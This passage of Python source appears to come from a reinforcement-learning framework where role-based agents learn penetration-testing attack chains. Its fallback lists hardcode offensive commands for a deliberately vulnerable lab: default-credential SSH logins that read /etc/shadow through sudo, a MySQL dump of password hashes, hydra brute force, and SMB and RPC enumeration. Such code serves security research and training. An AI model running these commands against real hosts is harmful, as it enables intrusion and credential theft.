                    value=self._ppo_pending["value"],
                    done=False,
                )
                self._ppo_pending = None
                logger.debug(
                    f"[PPO-NEG] {self.agent_name}: Stored penalty {penalty:.1f} "
                    f"for {reason}"
                )
        except Exception as e:
            logger.debug(f"[PPO-NEG] Failed to store penalty: {e}")
    
    # ─── Phase 8.0: Cross-episode attack chain memory ────────────────────────
    
    def _record_chain_step(self, command: str, reward: float) -> None:
        """Record a command + reward in the current episode's attack chain."""
        self._episode_chain.append(command)
        self._episode_chain_rewards.append(reward)
        # Decay exploration score on repeat, boost on new command
        if command in self._episode_chain[:-1]:
            self._exploration_score = max(0.1, self._exploration_score * 0.85)
        else:
            self._exploration_score = min(2.0, self._exploration_score * 1.1)
        
        # Phase 8.1: Hypothesis-test-learn cycle
        # Track which commands succeed/fail to build reasoning patterns
        if reward > 5.0:
            _success_note = f"✓ {command.split()[0]} worked (r={reward:.0f})"
            if _success_note not in self._reasoning_hypotheses:
                self._reasoning_hypotheses.append(_success_note)
                if len(self._reasoning_hypotheses) > 8:
                    self._reasoning_hypotheses = self._reasoning_hypotheses[-8:]
        elif reward < -2.0:
            _fail_note = f"✗ {command.split()[0]} failed"
            if _fail_note not in self._reasoning_failures:
                self._reasoning_failures.append(_fail_note)
                if len(self._reasoning_failures) > 6:
                    self._reasoning_failures = self._reasoning_failures[-6:]
    
    def _save_episode_chain(self, total_reward: float, highest_phase: str) -> None:
        """Save the current episode's chain to cross-episode memory if valuable."""
        if not self._episode_chain:
            return
        chain = {
            "commands": self._episode_chain.copy(),
            "rewards": self._episode_chain_rewards.copy(),
            "total_reward": total_reward,
            "highest_phase": highest_phase,
            "unique_commands": len(set(self._episode_chain)),
            "agent": self.agent_name,
        }
        self._successful_chains.append(chain)
        # Keep top N by total_reward
        self._successful_chains.sort(key=lambda c: c["total_reward"], reverse=True)
        self._successful_chains = self._successful_chains[:self._chain_memory_size]
        # Update best chain
        if self._best_chain is None or total_reward > self._best_chain["total_reward"]:
            self._best_chain = chain
            logger.info(
                f"[CHAIN-MEM] {self.agent_name}: New best chain! "
                f"reward={total_reward:.1f}, cmds={len(chain['commands'])}, "
                f"unique={chain['unique_commands']}, phase={highest_phase}"
            )
    
    def _get_chain_suggestion(self, step: int, current_phase: str) -> Optional[str]:
        """Get a command suggestion from the best attack chain for this phase/step.
        
        Phase 8.1: Enhanced with exploit path micro-curriculum.
        Returns command string if a relevant chain step exists, None otherwise.
        Used as a soft hint for the PPO/playbook decision.
        """
        if not self._best_chain:
            return None
        best_cmds = self._best_chain["commands"]
        if step < len(best_cmds):
            # Phase 8.1: Only suggest if the chain command matches current phase context
            # This prevents suggesting exploit commands during recon
            suggestion = best_cmds[step]
            return suggestion
        # Phase 8.1: If beyond the chain length but chain was successful,
        # suggest repeating the last high-reward command pattern
        if self._best_chain.get("total_reward", 0) > 2000 and best_cmds:
            # Find the highest-reward command in the chain
            chain_rewards = self._best_chain.get("rewards", [])
            if chain_rewards:
                best_idx = max(range(len(chain_rewards)), key=lambda i: chain_rewards[i])
                return best_cmds[best_idx]
        return None
    
    def _reset_episode_chain(self) -> None:
        """Reset current episode chain tracking."""
        self._episode_chain = []
        self._episode_chain_rewards = []
        self._exploration_score = 1.0
        self._reasoning_hypotheses = []
        self._reasoning_failures = []
        self._reasoning_plan = None
    
    def _build_reasoning_context(self, ctx: "AttackContext", step: int) -> str:
        """Build a rich reasoning context string for mentor/LLM calls.
        
        Phase 8.0: Includes attack chain history, failures, hypotheses,
        and cross-episode best chain info for better strategic reasoning.
        """
        parts = []
        parts.append(f"Step {step} | Phase: {ctx.current_phase.name}")
        parts.append(f"Target: {ctx.target}")
        
        # Discoveries summary
        _ports = ctx.discoveries.get("ports", []) if isinstance(ctx.discoveries, dict) else []
        _services = ctx.services_found if hasattr(ctx, "services_found") else []
        parts.append(f"Ports: {len(_ports)} | Services: {len(_services)}")
        parts.append(f"Creds: {'YES' if ctx.state_flags.get('credentials_known') else 'NO'}")
        parts.append(f"Shell: {'YES' if ctx.state_flags.get('shell_obtained') else 'NO'}")
        parts.append(f"Root: {'YES' if ctx.state_flags.get('root_shell_obtained') else 'NO'}")
        
        # Recent commands (last 5)
        if ctx.command_history:
            parts.append(f"Recent: {', '.join(ctx.command_history[-5:])}")
        
        # Failures (what we learned)
        if self._reasoning_failures:
            parts.append(f"Failed: {'; '.join(self._reasoning_failures[-3:])}")
        
        # Current hypotheses
        if self._reasoning_hypotheses:
            parts.append(f"Hypotheses: {'; '.join(self._reasoning_hypotheses[-2:])}")
        
        # Best chain hint
        if self._best_chain:
            chain_hint = self._best_chain["commands"][:5]
            parts.append(f"Best chain (prev episode): {' -> '.join(chain_hint)}")
        
        # Exploration score
        parts.append(f"Exploration: {self._exploration_score:.2f}")
        
        # Phase 8.1: Kill chain progress tracking
        if self._episode_chain:
            _unique = len(set(self._episode_chain))
            _total = len(self._episode_chain)
            parts.append(f"Chain: {_unique}/{_total} unique cmds")
        
        return " | ".join(parts)
    
    # ── R48: Dynamic phase-aware alternative selection ────────────────────
    def _get_dynamic_alternative(
        self,
        ctx: Any,
        used_cmds: set,
        used_prefixes: set,
    ) -> Optional[str]:
        """Get a phase-aware, role-filtered, macro-aware alternative from the registry.

        Returns a rendered command string, or None if no suitable command found.
        Uses the same filtering pipeline as _decide_registry / _force_novel_command
        but in a lightweight path suitable for anti-repeat fallback.
        """
        import random
        try:
            # 1. Get phase-valid, precondition-met commands
            state_flags = ctx.state_flags if hasattr(ctx, 'state_flags') else set()
            current_phase = ctx.current_phase if hasattr(ctx, 'current_phase') else None
            
            valid_commands = get_valid_commands_for_state(state_flags, current_phase)
            if not valid_commands:
                valid_commands = get_valid_commands_for_state(state_flags)
            if not valid_commands:
                return None
            
            # 2. Role filter
            role_filtered = self._filter_commands_for_role(valid_commands)
            if not role_filtered:
                return None
            
            # 3. Tool availability filter
            role_filtered = [cmd for cmd in role_filtered if self._is_tool_available(cmd)]
            if not role_filtered:
                return None
            
            # 4. DDQN macro filter — if a macro is active, prefer its commands
            macro_filtered = role_filtered
            if self._active_macro is not None:
                try:
                    from core.algorithms.ddqn_macro import MACRO_COMMAND_MAP
                    macro_allowed = MACRO_COMMAND_MAP.get(self._active_macro, set())
                    if macro_allowed:
                        _mf = [cmd for cmd in role_filtered if cmd.name in macro_allowed]
                        if len(_mf) >= 2:
                            macro_filtered = _mf
                except Exception:
                    pass
            
            # 5. Render and filter out already-used commands
            candidates = []
            params = {"target": ctx.target}
            for template in macro_filtered:
                for param in template.required_params:
                    if param not in params:
                        params[param] = self._get_default_param(param, ctx)
                rendered = render_command(template, params)
                # Skip exact matches with history
                if rendered.strip() in used_cmds:
                    continue
                # Skip commands with heavily-used prefixes
                prefix = self._extract_tool_prefix(rendered)
                prefix_uses = sum(1 for p in used_prefixes if p == prefix)
                if prefix_uses >= 3:
                    continue
                candidates.append((rendered, template.typical_reward))
            
            if not candidates:
                return None
            
            # 6. Sort by typical_reward descending and pick from top tier
            candidates.sort(key=lambda x: x[1], reverse=True)
            # Pick randomly from top 5 to maintain exploration
            top_n = min(5, len(candidates))
            chosen = random.choice(candidates[:top_n])
            return chosen[0]
            
        except Exception as e:
            logger.debug(f"[{self.agent_name}] Dynamic alternative failed: {e}")
            return None
    
    def _replace_with_alternative(
        self,
        result: SmartDecisionResult,
        step_ctx: SmartStepContext,
        ctx: Any,
        all_cmds: List[str],
        reason: str,
    ) -> SmartDecisionResult:
        """Replace a blocked command with a phase-aware, macro-aware alternative.

        R48: First tries to get a registry command matching the current phase,
        role, and DDQN macro-intent.  Falls back to static per-role pool only
        if the dynamic query yields nothing.
        """
        import random

        # R60: Track anti-repeat hits for codex meta spike trigger
        self._codex_meta_antirepeat_hits = getattr(self, '_codex_meta_antirepeat_hits', 0) + 1
        
        logger.debug(
            f"[{self.agent_name}] ANTI-REPEAT: Replacing '{result.command[:40]}...' ({reason})"
        )
        
        role_name = self.agent_role.get("role", "generic")
        step = step_ctx.step
        target = ctx.target
        rand_offset = random.randint(0, 1000)
        
        # ── R48: Phase-aware dynamic alternative from registry ────────────
        used_cmds_set = set(c.strip() for c in all_cmds if c.strip())
        used_prefixes = set(self._extract_tool_prefix(c) for c in all_cmds if c.strip())
        _dynamic_cmd = self._get_dynamic_alternative(ctx, used_cmds_set, used_prefixes)
        if _dynamic_cmd is not None:
            result.command = _dynamic_cmd
            result.mentor_reasoning = (
                f"[ANTI-REPEAT:{reason}→registry] "
                f"{result.mentor_reasoning or 'Phase-aware alternative'}"
            )
            result.confidence = 0.5  # Higher than static (0.3) — strategically coherent
            result.source = "anti_repeat"
            result._repeat_penalty = -5.0
            
            # Graduated PPO negative reward (same as static path)
            _repeat_penalty = -3.0
            if reason == "prefix_flood":
                _repeat_penalty = -8.0
            elif "exact_repeat" in reason:
                _repeat_count = sum(1 for c in all_cmds if c == result.command)
                _repeat_penalty = -3.0 - min(5.0, _repeat_count * 1.5)
            
            if self._ppo_pending is not None:
                self._ppo_trajectory.append({
                    "state": self._ppo_pending["state"],
                    "action": self._ppo_pending["action"],
                    "log_prob": self._ppo_pending["log_prob"],
                    "value": self._ppo_pending["value"],
                    "reward": _repeat_penalty,
                    "done": False,
                })
                self._ppo_pending = None
            
            logger.debug(
                f"[{self.agent_name}] ANTI-REPEAT→REGISTRY: "
                f"'{_dynamic_cmd[:50]}' (phase-aware)"
            )
            return result
        # ── End R48 dynamic alternative ───────────────────────────────────
        
        alternative_commands = {
            "recon": [
                f"nmap -sV -p 21,22,111,139,445,3306 {target}",
                f"nmap -sC -p 21,22,111,139,445,3306 {target}",
                f"nmap --script vuln -p 21,22,139,445 {target}",
                f"nmap -sV --version-intensity 5 -p 21,22,111,139,445,3306 {target}",
                f"nmap -A -p 21,22 {target}",
                f"nmap --script smb-vuln* -p 139,445 {target}",
                f"nmap --script ftp-anon,ftp-bounce -p 21 {target}",
                f"enum4linux -a {target}",
                f"smbclient -L //{target} -N",
                f"dig @{target} ANY",
                f"showmount -e {target}",
                f"finger @{target}",
            ],
            "offensive": [
                # Phase 8.1 B7: Exploit-path priority commands first
                # Phase 8.2 Batch 13: ALL sshpass variants use sudo to ensure uid=0(root) in output
                f"sshpass -p msfadmin ssh -o StrictHostKeyChecking=no -o HostKeyAlgorithms=+ssh-rsa msfadmin@{target} 'echo msfadmin | sudo -S cat /etc/shadow'",
                f"mysql -h {target} -u root -psploitme -e 'SELECT user,password FROM mysql.user' 2>/dev/null",
                f"sshpass -p msfadmin ssh -o StrictHostKeyChecking=no -o HostKeyAlgorithms=+ssh-rsa msfadmin@{target} 'echo msfadmin | sudo -S id'",
                f"mysql -h {target} -u root -psploitme -e 'show databases' 2>/dev/null",
                f"sshpass -p msfadmin ssh -o StrictHostKeyChecking=no -o HostKeyAlgorithms=+ssh-rsa msfadmin@{target} 'echo msfadmin | sudo -S cat /etc/shadow; echo msfadmin | sudo -S id'",
                f"sshpass -p msfadmin ssh -o StrictHostKeyChecking=no -o HostKeyAlgorithms=+ssh-rsa msfadmin@{target} 'echo msfadmin | sudo -S whoami; echo msfadmin | sudo -S id'",
                f"hydra -l msfadmin -p msfadmin ftp://{target} -t 4",
                f"hydra -l msfadmin -p msfadmin ssh://{target} -t 4",
                f"enum4linux -a {target}",
                f"rpcclient -U '' -N {target} -c 'enumdomusers'",
                f"smbclient //{target}/tmp -N -c 'ls'",
                f"searchsploit proftpd 1.3.5",
                f"searchsploit samba 3.0",
            ],
            "stealth": [
                f"nc -zv {target} 21 2>&1",
                f"nc -zv {target} 22 2>&1",
                f"nc -zv {target} 139 2>&1",
                f"nc -zv {target} 445 2>&1",
                f"nc -zv {target} 3306 2>&1",
                f"nc -zv {target} 111 2>&1",
                f"smbclient -L //{target} -N 2>/dev/null",
                f"rpcclient -U '' -N {target} -c 'srvinfo'",
                f"mysql -h {target} -u root -e 'show databases' 2>/dev/null",
                f"enum4linux -a {target} 2>/dev/null",
            ],
            "strategic": [
                # R47 Fix #5: Removed enum4linux/smbclient/rpcclient (Shadow-exclusive)
                f"nmap -sV -O -p 21,22,111,139,445,3306 {target}",
                f"nmap --script smb-enum-shares -p 139,445 {target}",
                f"nmap --script mysql-info -p 3306 {target}",
                f"nmap --script vuln -p 21,22,139,445 {target}",
                f"nmap -sC -p 1099,1524,2049,5432,8180 {target}",
                f"searchsploit vsftpd 2.3.4",
                f"searchsploit samba 3.0",
                f"searchsploit unrealircd",
            ],
            "defensive": [
                f"ss -tlnp 2>/dev/null",
                f"ps aux --sort=-%cpu 2>/dev/null",
                f"last -n {5 + step*2}",
                f"netstat -tulpn 2>/dev/null",
                f"lsof -i -P -n 2>/dev/null",
                f"iptables -L -n -v 2>/dev/null",
            ],
        }
        
        alts = alternative_commands.get(role_name, alternative_commands["recon"])
        # Phase 7.5: Filter alternatives for tool availability
        _ut = getattr(self, '_unavailable_tools', set())
        if _ut:
            alts = [cmd for cmd in alts
                    if cmd.strip().split()[0].lower() not in _ut]
        # R47 Fix #4: Skip sshpass alternatives when SSH is consistently failing
        _ssh_fails = getattr(self, '_ssh_failures_this_episode', 0)
        if _ssh_fails >= 2:
            alts = [cmd for cmd in alts if not cmd.strip().startswith("sshpass ")]
            if not alts:
                # Fallback: if ALL alternatives were sshpass, restore non-sshpass from role
                alts = alternative_commands.get(role_name, alternative_commands["recon"])
                alts = [cmd for cmd in alts if not cmd.strip().startswith("sshpass ")]
            if not alts:
                alts = alternative_commands["recon"]  # Ultimate fallback
        used_prefixes = set(self._extract_tool_prefix(c) for c in all_cmds if c.strip())
        available = [cmd for cmd in alts if self._extract_tool_prefix(cmd) not in used_prefixes]
        if not available:
            available = alts.copy()
            random.shuffle(available)
        new_cmd = random.choice(available) if available else alts[step % len(alts)]
        
        # R51: Prepend SSH cleanup to any sshpass alternative to prevent
        # "Connection closed" from MaxSessions exhaustion
        if new_cmd.strip().startswith("sshpass "):
            new_cmd = f"pkill -f 'ssh.*{target}' 2>/dev/null; sleep 0.3; {new_cmd}"
        
        result.command = new_cmd
        result.mentor_reasoning = f"[ANTI-REPEAT:{reason}] {result.mentor_reasoning or 'Forced alternative'}"
        result.confidence = 0.3
        result.source = "anti_repeat"
        result._repeat_penalty = -5.0
        
        # Phase 8.1 B7: Graduated negative reward for PPO learning
        # Worse penalty for repeat of already-failed commands
        _repeat_penalty = -3.0  # Base penalty
        if reason == "prefix_flood":
            _repeat_penalty = -8.0  # Severe: flooding same tool
        elif reason == "exact_repeat":
            _repeat_count = sum(1 for c in all_cmds if c == result.command)
            _repeat_penalty = -3.0 - min(5.0, _repeat_count * 1.5)  # Up to -10.5
        
        # Store PPO trajectory with graduated negative reward
        if self._ppo_pending is not None:
            self._ppo_trajectory.append({
                "state": self._ppo_pending["state"],
                "action": self._ppo_pending["action"],
                "log_prob": self._ppo_pending["log_prob"],
                "value": self._ppo_pending["value"],
                "reward": _repeat_penalty,
                "done": False,
            })
            self._ppo_pending = None
        
        return result
    
    def _filter_commands_for_role(self, commands: List[CommandTemplate]) -> List[CommandTemplate]:
        """
        Filter commands based on agent's role with EXCLUSIVE domain enforcement.
        
        Each agent has:
        - preferred_commands: Commands they should prioritize
        - command_tags: Tags they should look for
        - avoid_tags: Tags they should NOT use
        - exclusive_prefixes: Prefixes ONLY this agent can use (others cannot)
        """
        role = self.agent_role
        preferred_names = set(role.get("preferred_commands", []))
        wanted_tags = role.get("command_tags", set())
        avoid_tags = role.get("avoid_tags", set())
        primary_phases = role.get("primary_phases", [])
        my_exclusive = role.get("exclusive_prefixes", [])
        
        # Collect ALL exclusive prefixes from OTHER agents
        other_exclusive_prefixes = []
        for other_agent, other_role in self.AGENT_ROLES.items():
            if other_agent != self.agent_name:
                other_exclusive_prefixes.extend(other_role.get("exclusive_prefixes", []))
        
        filtered = []
        for cmd in commands:
            cmd_lower = cmd.name.lower()
            template_lower = cmd.template.lower() if hasattr(cmd, 'template') else ""
            
            # STRICT EXCLUSIVITY: Skip commands that belong to OTHER agents' exclusive domains
            # Check BOTH the command name AND the template
            belongs_to_other = False
            for prefix in other_exclusive_prefixes:
                prefix_lower = prefix.lower().strip()
                if cmd_lower.startswith(prefix_lower) or template_lower.startswith(prefix_lower):
                    belongs_to_other = True
                    break
            
            if belongs_to_other:
                continue  # This command belongs to another agent
            
            # Skip commands with avoided tags
            if cmd.tags & avoid_tags:
                continue
            
            # R42: Phase-gate — block commands from phases this agent doesn't operate in
            # Prevents post-exploit commands leaking to recon/strategic agents even
            # when their tags don't exactly match avoid_tags
            if primary_phases and cmd.phase not in primary_phases:
                # Allow preferred commands regardless of phase (explicit override)
                if cmd.name not in preferred_names:
                    continue
            
            # Skip commands already used this step (deduplication)
            if cmd.name in self.step_used_commands:
                continue
            
            # Phase 7.4: Skip commands for tools not installed on this system
            if not self._is_tool_available(cmd):
                continue
            
            # Prioritize preferred commands
            if cmd.name in preferred_names:
                filtered.insert(0, cmd)  # Add to front
            # Prioritize our exclusive commands
            elif any(cmd_lower.startswith(p.lower().strip()) for p in my_exclusive):
                filtered.insert(0, cmd)  # Our exclusive domain - high priority
            # Or commands with matching tags
            elif cmd.tags & wanted_tags:
                filtered.append(cmd)
            # Or commands in agent's primary phases
            elif cmd.phase in primary_phases:
                filtered.append(cmd)
            # Include some others for variety (with lower priority)
            elif not avoid_tags or not (cmd.tags & avoid_tags):
                filtered.append(cmd)
        
        return filtered
    
    # ── Phase 7.4: Tool availability filter ──────────────────────────────
    
    # Tools known to NOT be standard Linux utilities and likely missing.
    # We check these with shutil.which() once at init.
    # Phase 8.2 Batch 9: Added impacket-atexec, impacket-wmiexec, impacket-GetNPUsers,
    # impacket-GetUserSPNs, evil-winrm, redis-cli, linpeas, mysqldump, certipy
    # Phase 8.2 Batch 10: Added last, knock, dnsenum, wfuzz, ldapsearch, mysql (client)
    _TOOL_BINARIES = {
        "crackmapexec", "impacket-psexec", "impacket-secretsdump",
        "impacket-smbexec", "impacket-atexec", "impacket-wmiexec",
        "impacket-GetNPUsers", "impacket-GetUserSPNs",
        "smbmap", "dirsearch", "dnsrecon", "dnsenum",
        "wpscan", "commix", "chisel", "windapsearch", "enum4linux-ng",
        "rpcinfo", "gospider", "feroxbuster", "gobuster",
        "masscan", "whatweb", "smbclient", "rpcclient",
        "nuclei", "ffuf", "nikto", "sqlmap", "hydra",
        "nmap", "msfconsole", "msfvenom", "searchsploit",
        "enum4linux", "ftp", "telnet", "sshpass", "psql", "mysql",
        "curl", "nc", "dig", "wfuzz", "ldapsearch",
        "evil-winrm", "redis-cli", "linpeas", "mysqldump", "certipy",
        "last", "knock",
    }
    
    def _check_tool_availability(self) -> None:
        """One-time check: which tool binaries are installed on this system."""
        import shutil
        unavailable = set()
        for tool in self._TOOL_BINARIES:
            if not shutil.which(tool):
                unavailable.add(tool)
        self._unavailable_tools = unavailable
        if unavailable and self.agent_name == "RedAgent":
            # Only log once (from Red's perspective) to avoid 5× spam
            logger.info(
                f"[TOOL-CHECK] {len(unavailable)} unavailable tools filtered: "
                f"{', '.join(sorted(unavailable)[:10])}{'...' if len(unavailable) > 10 else ''}"
            )
    
    def _is_tool_available(self, cmd: "CommandTemplate") -> bool:
        """Check if the base tool for a command is installed."""
        if not self._unavailable_tools:
            return True
        # Extract the first word (tool binary) from the template
        template = cmd.template.strip()
        # Handle leading { echo or other wrappers
        if template.startswith("{"):
            # Multi-command block — usually fine (uses echo/telnet/etc.)
            return True
        if template.startswith("for ") or template.startswith("while "):
            return True
        first_word = template.split()[0] if template else ""
        # Strip path prefixes (e.g., /usr/bin/nmap → nmap)
        base_tool = first_word.rsplit("/", 1)[-1]
        return base_tool not in self._unavailable_tools
    
    def _get_blue_agent_command(self, ctx: AttackContext) -> SmartDecisionResult:
        """
        BlueAgent gets custom defensive commands - different from attack commands.
        Avoids commands used by other agents this step.
        """
        custom_commands = self.agent_role.get("custom_commands", [])
        if not custom_commands:
            # Fallback
            return None
        
        # Pick a command we haven't used recently AND not used this step
        recent = [d.command for d in self.decisions[-5:]] if self.decisions else []
        available = [c for c in custom_commands 
                     if c[0] not in recent 
                     and c[0][:50] not in self.step_used_commands]
        
        if not available:
            # All used, reset and pick from recent-excluded only
            available = [c for c in custom_commands if c[0] not in recent]
        
        if not available:
            available = custom_commands
        
        cmd, description = random.choice(available)
        
        return SmartDecisionResult(
            command=cmd,
            template_name="blue_defensive",
            params={},
            mentor_call=False,
            mentor_reasoning=f"🛡️ Defensive: {description}",
            confidence=0.75,
            phase=ctx.current_phase,
        )
    
    def _get_orion_coordination(self, ctx: AttackContext, step: int) -> SmartDecisionResult:
        """
        OrionAgent provides strategic coordination commands.
        Analyzes current state and suggests what phase/approach to take.
        Uses step counter to ensure variety and avoid repetition.
        """
        phase = ctx.current_phase
        state_flags = ctx.state_flags
        
        # Build a pool of strategic commands and cycle through them
        strategic_pool = []
        has_http = state_flags.get("http_service_found", False)
        
        if phase == AttackPhase.RECON:
            strategic_pool = [
                (f"nmap -sV -sC --top-ports 1000 {ctx.target}", "🎯 Strategy: Comprehensive port scan with scripts"),
                (f"nmap -sV -A -T4 {ctx.target}", "🎯 Strategy: Aggressive scan with OS detection"),
                (f"nmap -sU --top-ports 100 {ctx.target}", "🎯 Strategy: UDP port discovery"),
                (f"masscan -p1-65535 --rate=1000 {ctx.target}", "🎯 Strategy: Full port coverage at speed"),
                (f"nmap --script=discovery {ctx.target}", "🎯 Strategy: Service discovery scripts"),
            ]
        elif phase == AttackPhase.ENUMERATION:
            strategic_pool = [
                (f"enum4linux -a {ctx.target}", "🎯 Strategy: SMB enumeration"),
                (f"nmap --script=vuln {ctx.target}", "🎯 Strategy: Vulnerability scanning"),
                (f"smbclient -L //{ctx.target} -N", "🎯 Strategy: SMB share listing"),
                (f"nmap --script=smb-enum-shares,smb-enum-users {ctx.target}", "🎯 Strategy: SMB share/user enum"),
            ]
            if has_http:
                strategic_pool.extend([
                    (f"nikto -h http://{ctx.target}", "🎯 Strategy: Web vulnerability scan"),
                    (f"gobuster dir -u http://{ctx.target} -w /usr/share/dirb/wordlists/common.txt -q", "🎯 Strategy: Web directory enumeration"),
                    (f"whatweb -v {ctx.target}", "🎯 Strategy: Web technology fingerprinting"),
                ])
        elif phase == AttackPhase.EXPLOITATION:
            strategic_pool = [
                (f"LANG=C searchsploit --update 2>/dev/null; LANG=C searchsploit linux kernel", "🎯 Strategy: Search for kernel exploits"),
                (f"smbclient //{ctx.target}/tmp -N -c 'ls'", "🎯 Strategy: SMB anonymous share access"),
                (f"hydra -L /usr/share/nmap/nselib/data/usernames.lst -P /usr/share/nmap/nselib/data/passwords.lst ssh://{ctx.target} -t 4", "🎯 Strategy: SSH credential attack"),
                (f"mysql -h {ctx.target} -u root -e 'show databases;' 2>/dev/null", "🎯 Strategy: MySQL default creds"),
            ]
        else:
            strategic_pool = [
                (f"echo '[Orion] Phase: {phase.name} | Ready to coordinate'", f"🎯 Strategy: {phase.name} phase coordination"),
                (f"nmap -sV {ctx.target}", "🎯 Strategy: Re-scan to update intel"),
            ]
        
        # Filter out unavailable tools
        if hasattr(self, '_unavailable_tools'):
            strategic_pool = [
                (cmd, desc) for cmd, desc in strategic_pool
                if cmd.split()[0].split("/")[-1] not in self._unavailable_tools
            ]
        if not strategic_pool:
            strategic_pool = [
                (f"nmap -sV {ctx.target}", "🎯 Strategy: Fallback re-scan"),
            ]
        
        # Cycle through pool based on step to avoid repetition
        idx = step % len(strategic_pool)
        cmd, reasoning = strategic_pool[idx]
        
        return SmartDecisionResult(
            command=cmd,
            template_name="orion_strategic",
            params={"target": ctx.target},
            mentor_call=False,
            mentor_reasoning=reasoning,
            confidence=0.8,
            phase=phase,
        )
    
    def _decide_from_registry(
        self,
        step_ctx: SmartStepContext,
        proposed_action: Optional[str],
        confidence: float,
    ) -> SmartDecisionResult:
        """
        Make decision using the command registry with ROLE-BASED filtering.
        
        Each agent picks commands appropriate for their role:
        - ScoutAgent: Recon/discovery commands
        - RedAgent: Exploitation/attack commands  
        - BlueAgent: Defensive monitoring commands
        - OrionAgent: Strategic coordination
        - ShadowAgent: Stealth/persistence commands
        """
        ctx = step_ctx.attack_context
        role_name = self.agent_role.get("role", "generic")
        
        # =====================================================================
        # SPECIAL HANDLING FOR BLUE AGENT (Defensive)
        # =====================================================================
        if role_name == "defensive":
            result = self._get_blue_agent_command(ctx)
            if result:
                return result
        
        # =====================================================================
        # SPECIAL HANDLING FOR ORION (Strategic Coordinator)
        # =====================================================================
        if role_name == "strategic" and self.agent_role.get("is_coordinator"):
            return self._get_orion_coordination(ctx, step_ctx.step)
        
        # =====================================================================
        # ROLE-BASED COMMAND SELECTION (Scout, Red, Shadow)
        # =====================================================================
        
        # Get valid commands for current state
        valid_commands = get_valid_commands_for_state(ctx.state_flags, ctx.current_phase)
        
        if not valid_commands:
            # Try without phase filter
            valid_commands = get_valid_commands_for_state(ctx.state_flags)
        
        # Apply role-based filtering
        filtered_commands = self._filter_commands_for_role(valid_commands)
        
        # =====================================================================
        # PHASE 4: PPO-DRIVEN SELECTION (BEFORE fallback)
        # PPO has its own action mapper per role, can pick even when registry
        # filtering leaves nothing. Moved here so PPO gets first shot.
        # =====================================================================
        if self.ppo_agent and self.action_mapper:
            ppo_result = self._ppo_select_command(step_ctx, filtered_commands if filtered_commands else valid_commands)
            if ppo_result is not None:
                return ppo_result

        if not filtered_commands:
            # =========================================================
            # SMART FALLBACK - Track FULL commands AND unique signatures
            # =========================================================
            step = step_ctx.step
            
            # Track FULL commands to avoid exact repeats + command signatures for variety
            tried_commands = set()
            tried_signatures = set()  # (prefix, key_flags) tuple for detecting similar commands
            if ctx.command_history:
                for cmd in ctx.command_history[-20:]:  # Look at more history
                    tried_commands.add(cmd.strip())
                    parts = cmd.strip().split()
                    if parts:
                        # Create signature from prefix + first 2-3 flags
                        sig = parts[0].lower()
                        if len(parts) > 1:
                            sig += "_" + "_".join(p.lower() for p in parts[1:3] if p.startswith("-"))
                        tried_signatures.add(sig)
            
            if role_name == "recon":
                # COMPREHENSIVE list with diverse tools (not just nmap)
                recon_fallbacks = [
                    # === NETWORK SCANNING (different approaches) ===
                    (f"nmap -sT --top-ports 100 {ctx.target}", "nmap_-st_--top-ports", "🔍 TCP top-100 scan"),
                    (f"nmap -sV -Pn {ctx.target}", "nmap_-sv_-pn", "🔍 Version detection no-ping"),
                    (f"nmap -sU --top-ports 20 {ctx.target}", "nmap_-su_--top-ports", "🔍 UDP scan"),
                    (f"nmap -A -T4 {ctx.target}", "nmap_-a_-t4", "🔍 Aggressive fast scan"),
                    (f"nmap -sT -Pn {ctx.target}", "nmap_-ss_-pn", "🔍 SYN stealth no-ping"),
                    (f"nmap --script discovery {ctx.target}", "nmap_--script_discovery", "🔍 Discovery scripts"),
                    (f"nmap -sC -sV {ctx.target}", "nmap_-sc_-sv", "🔍 Default scripts + version"),
                    (f"nmap -p- --min-rate 5000 {ctx.target}", "nmap_-p-_--min-rate", "🔍 All ports fast"),
                    (f"nmap --script vuln {ctx.target}", "nmap_--script_vuln", "🔍 Vuln scripts"),
                    (f"nmap -sV -sC -O {ctx.target}", "nmap_-sv_-sc", "🔍 Full OS detection"),
                    # === ALTERNATIVE SCANNERS (PRIORITIZE variety) ===
                    (f"masscan -p1-1000 --rate=500 {ctx.target}", "masscan_-p1-1000", "🔍 Fast masscan 1K"),
                    (f"masscan -p1-65535 --rate=2000 {ctx.target}", "masscan_-p1-65535", "🔍 Full port masscan"),
                    (f"masscan -p 21,22,80,443,445,3389 {ctx.target}", "masscan_-p_21", "🔍 Masscan common ports"),
                    (f"rustscan -a {ctx.target} --ulimit 5000 -- -sC", "rustscan_-a", "🔍 Rustscan fast"),
                    # === DNS/OSINT (different queries) ===
                    (f"dig {ctx.target} ANY +noall +answer", "dig_any", "🔍 DNS ANY query"),
                    (f"dig {ctx.target} MX +short", "dig_mx", "🔍 DNS MX records"),
                    (f"dig {ctx.target} NS +short", "dig_ns", "🔍 DNS nameservers"),
                    (f"dig {ctx.target} TXT +short", "dig_txt", "🔍 DNS TXT records"),
                    (f"dig -x {ctx.target} +short", "dig_-x", "🔍 Reverse DNS"),
                    (f"whois {ctx.target}", "whois", "🔍 WHOIS lookup"),
                    (f"host -t A {ctx.target}", "host_-t", "🔍 Host lookup"),
                    # === WEB FINGERPRINTING ===
                    (f"whatweb -a 3 http://{ctx.target}", "whatweb_-a", "🔍 Web fingerprint aggressive"),
                    (f"whatweb http://{ctx.target}:8080", "whatweb_8080", "🔍 Web fingerprint alt port"),
                    (f"curl -sI http://{ctx.target}", "curl_-si", "🔍 HTTP headers"),
                    (f"curl -sI https://{ctx.target} -k", "curl_-si_https", "🔍 HTTPS headers"),
                    (f"wafw00f http://{ctx.target}", "wafw00f", "🔍 WAF detection"),
                    # === PASSIVE/LIGHT PROBES ===
                    (f"ping -c 2 {ctx.target}", "ping_-c", "🔍 Host alive check"),
                    (f"traceroute -n {ctx.target} 2>/dev/null | head -10", "traceroute_-n", "🔍 Network path"),
                    (f"arping -c 2 {ctx.target} 2>/dev/null", "arping_-c", "🔍 ARP probe"),
                ]
                # Filter out commands with matching signatures (NOT just prefixes)
                untried = [(c, sig, r) for c, sig, r in recon_fallbacks 
                           if sig not in tried_signatures and c not in tried_commands]
                
                if untried:
                    cmd, _, reason = random.choice(untried)
                else:
                    # ALL fallbacks exhausted - use STEP-BASED rotation through NON-NMAP tools
                    diverse_rotation = [
                        (f"masscan -p{1000 + step*500}-{1500 + step*500} {ctx.target}", "🔍 Masscan port range"),
                        (f"dig {ctx.target} AAAA +short", "🔍 DNS IPv6"),
                        (f"curl -sI http://{ctx.target}:{80 + step*10}", "🔍 HTTP alt port"),
                        (f"whatweb -v http://{ctx.target}", "🔍 Whatweb verbose"),
